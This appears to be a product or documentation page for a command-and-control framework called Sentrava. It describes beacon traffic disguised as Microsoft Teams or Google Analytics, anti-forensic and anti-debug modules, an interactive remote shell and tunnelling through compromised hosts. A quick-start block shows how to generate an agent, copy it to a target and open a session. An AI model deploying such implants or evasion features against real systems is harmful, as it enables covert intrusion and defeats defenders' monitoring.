Capability map / 01

An operator’s control plane.

Clear boundaries. Explicit permissions. Documented verification.

Supported

Triple Transport

mTLS with mutual certificate authentication, AES-256-GCM encrypted TCP, and HTTP polling with C2 profile masquerading. Each transport is independently configurable.

Transport reference ↗
Supported

Traffic Masquerade

Built-in HTTP profiles that disguise beacon traffic as Microsoft Teams presence updates, Google Analytics beacons, or Cloudflare RUM telemetry. Custom profiles via YAML.

HTTP profiles ↗
Supported

5-Module OPSEC Suite

Sleep masking with madvise anti-forensics, polymorphic config re-encryption, TLS fingerprint validator, environment guardrails, and anti-debug canary. Three presets: none, basic, full.

OPSEC modules ↗
Supported

Interactive PTY Shell

Full interactive bash shell via Linux PTY. Windows agents use one-shot exec for command output. Requires session mode. Exit with Ctrl+Q.

Shell capability ↗
Supported

TCP Port Forwarding

Tunnel any TCP connection through the agent to unreachable network segments. SSH, RDP, database access — verified with live SSH tunneling through C2.

Port forwarding ↗
Supported

Operator Dashboard

Real-time web dashboard with SSE live updates. Manage listeners, agents, sessions, tasks, and operations. Add listeners and activate agents directly from the browser.

Quick start / 02

Up and running
in minutes.

Zero-flag agent deployment. Credentials embedded at build time via ldflags.

Read the full deployment guide →
bash · quick start
# Start teamserver
./bin/sentrava-server

# Launch operator client
./bin/sentrava-client

# Create operation and generate agent
sentrava > operations create op1 --target 192.168.0.197
sentrava > generate --listener 192.168.0.199:4433

# Deploy on target
scp <package>/sentrava-agent user@target:~/
# On target: ./sentrava-agent

# Get a session
sentrava > sessions list
sentrava > sessions use <id>
sentrava > whoami
